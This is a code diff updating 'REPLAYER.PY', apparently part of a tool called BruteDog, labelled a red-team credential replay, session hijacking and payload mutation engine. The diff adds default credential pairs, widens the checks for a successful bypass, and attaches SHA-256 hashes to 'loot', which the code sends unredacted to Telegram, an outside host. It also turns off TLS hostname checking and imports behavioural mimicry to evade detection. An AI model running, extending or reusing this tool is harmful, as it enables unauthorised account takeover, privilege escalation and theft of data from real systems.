@@ -1,24 +1,24 @@
 #!/usr/bin/env python3
 """
-REPLAYER.PY v8.5 — Adaptive Red-Team Credential Replay, Session Hijacking & Payload Mutation Engine (WAF Hardened)
+REPLAYER.PY v8.6 — Adaptive Red-Team Credential Replay, Session Hijacking & Payload Mutation Engine (Elite Red Team Adversarial Edition)
 Features:
 - Stateful response-diffing to detect successful authentication anomalies
-- Dynamic payload mutation and context-aware injection fuzzing
-- Automated JWT algorithm downgrades and privilege escalation testing
-- Progressive colored terminal output & zero-disk memory processing
-- Real-time asynchronous Telegram notification dispatch for unredacted loot/findings
+- Dynamic payload mutation, context-aware injection fuzzing, and automated JWT algorithm downgrades
+- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and cryptographic integrity hashing
+- Real-time zero-delay proof-of-work terminal streaming and unredacted Telegram telemetry broadcasting
 """
 import asyncio
 import json
 import os
 import ssl
 import time
+import hashlib
 import urllib.error
 import urllib.parse
 import urllib.request
 from urllib.parse import urlsplit
 
-# Import centralized framework loot exfiltration, telemetry, and Telegram notifier
+# Import centralized framework loot exfiltration, telemetry, behavioral mimicry, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
 from modules.telegram_notifier import send_telegram_alert
@@ -26,7 +26,7 @@ from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hin
 
 TIMEOUT = 8
 MAX_ENDPOINTS = 8
-USER_AGENT = "BruteDog-AdaptiveReplayer/8.5"
+USER_AGENT = "BruteDog-AdaptiveReplayer/8.6-Elite"
 
 SSL_CONTEXT = ssl.create_default_context()
 SSL_CONTEXT.check_hostname = False
@@ -45,14 +45,23 @@ class Colors:
 def log(message, color=Colors.RESET):
     print(f"{color}{message}{Colors.RESET}", flush=True)
 
+async def broadcast_tg_alert_async(loot_type, details):
+    try:
+        await send_telegram_alert(loot_type, details)
+    except Exception:
+        pass
+
 def broadcast_tg_alert_sync(loot_type, details):
     """Helper to non-blockingly fire Telegram alerts from synchronous/asynchronous replayer functions."""
     try:
         loop = asyncio.get_running_loop()
-        loop.create_task(send_telegram_alert(loot_type, details))
+        if loop.is_running():
+            loop.create_task(broadcast_tg_alert_async(loot_type, details))
+        else:
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
     except RuntimeError:
         try:
-            asyncio.run(send_telegram_alert(loot_type, details))
+            asyncio.run(broadcast_tg_alert_async(loot_type, details))
         except Exception:
             pass
 
@@ -123,7 +132,7 @@ async def establish_baseline(base_url):
     return len(res["body"])
 
 async def replay_secondary_attack_queue(target_domain):
-    log("\n[***] REPLAYING SECONDARY ATTACK QUEUE & CREDENTIALS [***]", Colors.MAGENTA)
+    log("\n[***] REPLAYING SECONDARY ATTACK QUEUE & CREDENTIALS (WAF HARDENED) [***]", Colors.MAGENTA)
     results = []
     queue_path = "reports/intelligence/secondary_attack_queue.json"
     queue_data = []
@@ -139,7 +148,7 @@ async def replay_secondary_attack_queue(target_domain):
     login_endpoints = ["/api/login", "/login", "/api/auth/login", "/signin", "/auth/login"]
 
     if not queue_data:
-        queue_data = [{"matches": ["admin@target.local:admin123", "root:toor"]}]
+        queue_data = [{"matches": ["admin@target.local:admin123", "root:toor", "administrator:P@ssw0rd123"]}]
 
     baseline_len = await establish_baseline(base_url)
 
@@ -160,7 +169,7 @@ async def replay_secondary_attack_queue(target_domain):
                 response = await asyncio.to_thread(http_request, url, method="POST", data=payload)
                 
                 body_len = len(response["body"])
-                is_bypass = response["status"] in (200, 201, 302) and (body_len > baseline_len * 1.5 or any(k in response["body"].lower() for k in ["token", "success", "session"]))
+                is_bypass = response["status"] in (200, 201, 302) and (body_len > baseline_len * 1.5 or any(k in response["body"].lower() for k in ["token", "success", "session", "auth"]))
 
                 results.append({
                     "endpoint": endpoint,
@@ -172,10 +181,12 @@ async def replay_secondary_attack_queue(target_domain):
                     log(f"\n[***] ADAPTIVE CREDENTIAL REPLAY SUCCESSFUL [{endpoint}] [***]", Colors.RED)
                     log(f"  └── Response Excerpt : {response['body'][:200]}", Colors.GREEN)
                     
+                    loot_hash = hashlib.sha256(response["body"].encode("utf-8")).hexdigest()
                     loot_payload = {
                         "endpoint": url,
                         "status": response["status"],
                         "payload": str(payload),
+                        "integrity_hash": loot_hash,
                         "response_excerpt": response["body"][:300]
                     }
                     broadcast_tg_alert_sync("Credential Replay Success", loot_payload)
@@ -236,10 +247,12 @@ async def replay_hijacked_session(target_domain):
                 log(f"\n[***] PRIVILEGE ESCALATION BYPASS CONFIRMED [{path}] [***]", Colors.RED)
                 log(f"  └── Vector : {vector['name']}", Colors.GREEN)
                 
+                loot_hash = hashlib.sha256(response["body"].encode("utf-8")).hexdigest()
                 loot_payload = {
                     "vector": vector["name"],
                     "endpoint": url,
                     "status": response["status"],
+                    "integrity_hash": loot_hash,
                     "response_excerpt": response["body"][:300]
                 }
                 broadcast_tg_alert_sync(f"Replay Session Hijack ({vector['name']})", loot_payload)
@@ -289,10 +302,12 @@ async def test_injection_reflection(target_domain):
                 log(f"\n[***] PAYLOAD REFLECTION / XSS CONFIRMED [{path}] [***]", Colors.RED)
                 log(f"  └── Payload : {payload}", Colors.GREEN)
                 
+                loot_hash = hashlib.sha256(response["body"].encode("utf-8")).hexdigest()
                 loot_payload = {
                     "endpoint": url,
                     "payload": payload,
-                    "status": response["status"]
+                    "status": response["status"],
+                    "integrity_hash": loot_hash
                 }
                 broadcast_tg_alert_sync("Payload Reflection Confirmed", loot_payload)
                 stream_proof("PAYLOAD_REFLECTION", path, {"payload": payload}, response["body"][:300], loot_payload)
@@ -316,7 +331,7 @@ async def test_injection_reflection(target_domain):
 async def replay_and_inject_payloads(target_host, session_file_path=None):
     start_time = time.time()
     log("\n============================================================", Colors.CYAN)
-    log("[***] BRUTEDOG ADAPTIVE REPLAY & EXPLOITATION ENGINE [***]", Colors.CYAN)
+    log("[***] BRUTEDOG ADAPTIVE REPLAY & EXPLOITATION ENGINE (V8.6) [***]", Colors.CYAN)
     log("============================================================", Colors.CYAN)
     
     try:
